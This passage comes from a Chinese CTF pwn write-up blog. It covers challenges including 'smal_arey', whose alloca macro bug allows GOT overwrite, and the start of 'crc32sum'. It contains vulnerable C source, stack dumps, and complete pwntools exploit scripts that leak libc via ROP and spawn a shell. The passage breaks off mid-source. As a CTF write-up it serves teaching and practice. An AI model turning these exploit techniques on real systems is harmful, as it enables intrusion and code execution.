function_\">get_c_str</span>():</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;choice: &quot;</span>, <span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set_str</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;choice: &quot;</span>, <span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;str: &quot;</span>, data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_str</span>():</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;choice: &quot;</span>, <span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># b *0x4013E6</span></span><br><span class=\"line\">got = <span class=\"number\">0x404048</span> <span class=\"comment\"># _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@got.plt</span></span><br><span class=\"line\">binsh = <span class=\"number\">0x4016DE</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">\tset_c_str(<span class=\"string\">b&quot;A&quot;</span> * <span class=\"number\">0x20</span> + p64(got))</span><br><span class=\"line\">\tset_str(p64(binsh))</span><br><span class=\"line\">\tir()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">\texp()</span><br></pre></td></tr></table></figure>\n<h1 id=\"smal_arey\"><a class=\"markdownIt-Anchor\" href=\"#smal_arey\">#</a> smal_arey</h1>\n<p>只开了 NX</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARRAY_SIZE(n) (n * sizeof(long))</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARRAY_NEW(n) (long*)alloca(ARRAY_SIZE(n + 1))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">long</span> size, index, *arr;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size: &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%ld&quot;</span>, &amp;size) != <span class=\"number\">1</span> || size &lt; <span class=\"number\">0</span> || size &gt; <span class=\"number\">5</span>)<span class=\"comment\">// 1 2 3 4</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  arr = ARRAY_NEW(size);                   [<span class=\"number\">1</span>] &lt;&lt;- 在栈上申请 n + <span class=\"number\">1</span> 个size</span><br><span class=\"line\">  <span class=\"title function_\">while</span> <span class=\"params\">(<span class=\"number\">1</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;index: &quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%ld&quot;</span>, &amp;index) != <span class=\"number\">1</span> || index &lt; <span class=\"number\">0</span> || index &gt;= size)</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;value: &quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%ld&quot;</span>, &amp;arr[index]);             [<span class=\"number\">2</span>] &lt;&lt;- 在size范围内进行任意四字节的读写</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__attribute__((constructor))</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">setup</span><span class=\"params\">(<span class=\"type\">void</span>)</span> &#123;</span><br><span class=\"line\">  alarm(<span class=\"number\">180</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdin</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>alloca</code>  是在栈上分配内存 并自动释放<br>\n其实就一个指针指向栈上 然后 rsp 减下去罢了<br>\n宏的分配问题</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARRAY_SIZE(n) (n * sizeof(long))</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARRAY_NEW(n) (long*)alloca(ARRAY_SIZE(n + 1))</span></span><br><span class=\"line\"></span><br><span class=\"line\">=&gt; alloca(n + <span class=\"number\">1</span> * <span class=\"keyword\">sizeof</span>(<span class=\"type\">long</span>))</span><br></pre></td></tr></table></figure>\n<p>然后 <code>size</code>  如果能被覆盖的话 idx 就能越界了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> *v4; <span class=\"comment\">// rsp</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> __int64 size; <span class=\"comment\">// [rsp+8h] [rbp-20h] BYREF</span></span><br></pre></td></tr></table></figure>\n<p>这个 alloca 其实就是减去 rsp 然后往栈顶存放</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ rsp <span class=\"number\">0x7ffd12538830</span> —▸ <span class=\"number\">0x4013e3</span> (__libc_csu_init+<span class=\"number\">99</span>) ◂— pop    rdi</span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│     <span class=\"number\">0x7ffd12538838</span> —▸ <span class=\"number\">0x404020</span> (<span class=\"built_in\">printf</span>@got.plt) —▸ <span class=\"number\">0x7f2a5fcc3c90</span> (<span class=\"built_in\">printf</span>) ◂— endbr64</span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│     <span class=\"number\">0x7ffd12538840</span> —▸ <span class=\"number\">0x401094</span> (<span class=\"built_in\">printf</span>@plt+<span class=\"number\">4</span>) ◂— bnd jmp qword ptr [rip + <span class=\"number\">0x2f85</span>]</span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│     <span class=\"number\">0x7ffd12538848</span> —▸ <span class=\"number\">0x4010d0</span> (_start) ◂— endbr64</span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│     <span class=\"number\">0x7ffd12538850</span> ◂— <span class=\"number\">0x7fffffffffffffff</span>            [<span class=\"number\">1</span>] &lt;- size</span><br></pre></td></tr></table></figure>\n<p><code>%ld</code>  的最大写入为 <code>0x7fffffffffffffff</code> <br>\n 可以覆盖掉 size 和 arr 达到 got 表任意写的效果 可以通过不合法的值触发 exit</p>\n<p>再看看返回地址<br>\n如果在栈中触发 exit 的 got 会压入返回地址<br>\n只需要让 rsp+8 就能执行 ROP 了 也就是写个 pop ret</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rsp <span class=\"number\">0x7ffd12538830</span> —▸ <span class=\"number\">0x4013e3</span> (__libc_csu_init+<span class=\"number\">99</span>) ◂— pop    rdi</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538838</span> —▸ <span class=\"number\">0x404020</span> (<span class=\"built_in\">printf</span>@got.plt) —▸ <span class=\"number\">0x7f2a5fcc3c90</span> (<span class=\"built_in\">printf</span>) ◂— endbr64</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538840</span> —▸ <span class=\"number\">0x401094</span> (<span class=\"built_in\">printf</span>@plt+<span class=\"number\">4</span>) ◂— bnd jmp qword ptr [rip + <span class=\"number\">0x2f85</span>]</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538848</span> —▸ <span class=\"number\">0x4010d0</span> (_start) ◂— endbr64</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538850</span> ◂— <span class=\"number\">0x7fffffffffffffff</span>                                         [<span class=\"number\">2</span>] &lt;- size</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538858</span> ◂— <span class=\"number\">0x4</span></span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538860</span> —▸ <span class=\"number\">0x7ffd12538830</span> —▸ <span class=\"number\">0x4013e3</span> (__libc_csu_init+<span class=\"number\">99</span>) ◂— pop rdi [<span class=\"number\">1</span>] &lt;- arr</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538868</span> ◂— <span class=\"number\">0x2abd7f93dc67a400</span></span><br><span class=\"line\">rbp <span class=\"number\">0x7ffd12538870</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538878</span> —▸ <span class=\"number\">0x7f2a5fc86083</span> (__libc_start_main+<span class=\"number\">243</span>) ◂— mov    edi, eax</span><br></pre></td></tr></table></figure>\n<p>总流程如下</p>\n<ul>\n<li>通过 alloca 的指针在 rsp 栈顶布置我们的 rop 并劫持 size 后篡改 alloca 出来的指针 达到 got 任意写的效果</li>\n<li>进入 exit 的 got 的时候 会压入返回地址 执行 rop 的时候要 pop 掉这个</li>\n<li>ROP 用经典 plt 泄漏 got 的套路 并返回 main</li>\n<li>重复上述</li>\n</ul>\n<h2 id=\"exp-2\"><a class=\"markdownIt-Anchor\" href=\"#exp-2\">#</a> exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> * </span><br><span class=\"line\">context(os=<span class=\"string\">&quot;Linux&quot;</span>,arch=<span class=\"string\">&quot;amd64&quot;</span>,log_level=<span class=\"string\">&quot;debug&quot;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./chall&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span>                    :p.recvline()</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims             :p.recvuntil(delims)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">info    = <span class=\"keyword\">lambda</span> tag, addr          :p.info(<span class=\"string\">&#x27;======&gt;&#x27;</span>+tag + <span class=\"string\">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class=\"built_in\">format</span>(addr))</span><br><span class=\"line\">ir      = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">ri      = <span class=\"keyword\">lambda</span>                    :raw_input()</span><br><span class=\"line\">ps      = <span class=\"keyword\">lambda</span>                    :pause()</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc-2.31.so&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./chall&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set</span>(<span class=\"params\">idx, val</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;index: &quot;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;value: &quot;</span>, <span class=\"built_in\">str</span>(val))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;size:&quot;</span>, <span class=\"string\">&quot;5&quot;</span>)<span class=\"comment\"># 0 - 5</span></span><br><span class=\"line\">\tpop_rdi = <span class=\"number\">0x4013e3</span></span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">0</span>, pop_rdi)</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">1</span> ,elf.got[<span class=\"string\">&quot;printf&quot;</span>])</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">2</span> ,elf.plt[<span class=\"string\">&quot;printf&quot;</span>])</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">3</span> ,elf.sym[<span class=\"string\">&quot;_start&quot;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># falsify size</span></span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">4</span> ,<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\">\t<span class=\"comment\"># hijack arr</span></span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">6</span> ,elf.got[<span class=\"string\">&quot;exit&quot;</span>])</span><br><span class=\"line\">\t<span class=\"comment\"># falsify got[exit]&#x27;s content</span></span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">0</span> ,pop_rdi)</span><br><span class=\"line\">\t<span class=\"comment\"># trigger</span></span><br><span class=\"line\">\tri()</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;index: &quot;</span>, <span class=\"string\">&quot;-1&quot;</span>)</span><br><span class=\"line\">\tleak = uu64(ru(<span class=\"string\">&quot;\\x7f&quot;</span>)[-<span class=\"number\">6</span>:])</span><br><span class=\"line\">\tinfo(<span class=\"string\">&quot;leak&quot;</span>,leak)</span><br><span class=\"line\">\tlibc_base = leak - <span class=\"number\">0x7ffff7e1fc90</span> + <span class=\"number\">0x7ffff7dbe000</span></span><br><span class=\"line\">\tinfo(<span class=\"string\">&quot;libc_base&quot;</span>,libc_base)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># pwn</span></span><br><span class=\"line\">\tbinsh = libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&quot;/bin/sh&quot;</span>))</span><br><span class=\"line\">\tsystem = libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;size:&quot;</span>, <span class=\"string\">&quot;5&quot;</span>)<span class=\"comment\"># 0 - 5</span></span><br><span class=\"line\">\tpop_rdi = <span class=\"number\">0x4013e3</span></span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">0</span>, pop_rdi)</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">1</span> ,binsh)</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">2</span> ,system)</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">4</span> ,<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">6</span> ,elf.got[<span class=\"string\">&quot;exit&quot;</span>])</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">0</span> ,pop_rdi)</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;index: &quot;</span>, <span class=\"string\">&quot;-1&quot;</span>)</span><br><span class=\"line\">\tir()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">\texp()</span><br></pre></td></tr></table></figure>\n<h2 id=\"关于逆向的一点补充\"><a class=\"markdownIt-Anchor\" href=\"#关于逆向的一点补充\">#</a> 关于逆向的一点补充</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v3 = <span class=\"number\">16</span> * ((size + <span class=\"number\">31</span>) / <span class=\"number\">0x10</span>);</span><br><span class=\"line\"><span class=\"keyword\">while</span> ( &amp;size != (<span class=\"type\">unsigned</span> __int64 *)((<span class=\"type\">char</span> *)&amp;size - (v3 &amp; <span class=\"number\">0xFFFFFFFFFFFFF000</span>LL)) )</span><br><span class=\"line\">  ;</span><br><span class=\"line\">v4 = alloca(v3 &amp; <span class=\"number\">0xFFF</span>);</span><br></pre></td></tr></table></figure>\n<p>这里就可以看到 size 在 1 - 17 之间的 v3 都是不会变的<br>\n也就是  <code>n + sizeof(long)</code>  与 0x10 对齐的情况</p>\n<h1 id=\"crc32sum\"><a class=\"markdownIt-Anchor\" href=\"#crc32sum\">#</a> crc32sum</h1>\n<p>权限逃逸（亦或者说普通堆</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ctype.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;limits.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/file.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Calculate CRC32 hash for data</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">crc32</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *data, <span class=\"type\">size_t</span> size)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> i, j;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> hash;</span><br><span class=\"line\"></span><br><span class=\"line\">  hash = <span class=\"number\">0xFFFFFFFF</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; size; i++) &#123;</span><br><span class=\"line\">    hash ^= data[i];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; CHAR_BIT; j++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (hash &amp; <span class=\"number\">1</span>)</span><br><span class=\"line\">        hash = (hash &gt;&gt; <span class=\"number\">1</span>) ^ <span class=\"number\">0xEDB88320</span>;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">        hash &gt;&gt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> hash ^ <span class=\"number\">0xFFFFFFFF</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Calculate CRC32 hash for file</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">crc32sum</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *filepath)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> fd;</span><br><span class=\"line\">  <span class=\"type\">char</span> *buffer, *p;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stat</span> <span class=\"title\">stbuf</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Try to open file */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((fd = open(filepath, O_RDONLY)) &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    perror(filepath);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Lock file */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (flock(fd, LOCK_SH)) &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;flock&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Get file size */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fstat(fd, &amp;stbuf)) &#123;</span><br><span class=\"line\">    perror(filepath);</span><br><span class=\"line\">    flock(fd, LOCK_UN);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Allocate buffer */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!(buffer = <span class=\"built_in\">malloc</span>(stbuf.st_size))) &#123;    [<span class=\"number\">1</span>] &lt;&lt;- 漏洞点所在 pipe是没有size的</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;Memory Error&quot;</span>);</span><br><span class=\"line\">    flock(fd, LOCK_UN);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Read file */</span></span><br><span class=\"line\">  p = buffer;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (read(fd, p++, <span class=\"number\">1</span>) == <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Calculate hash 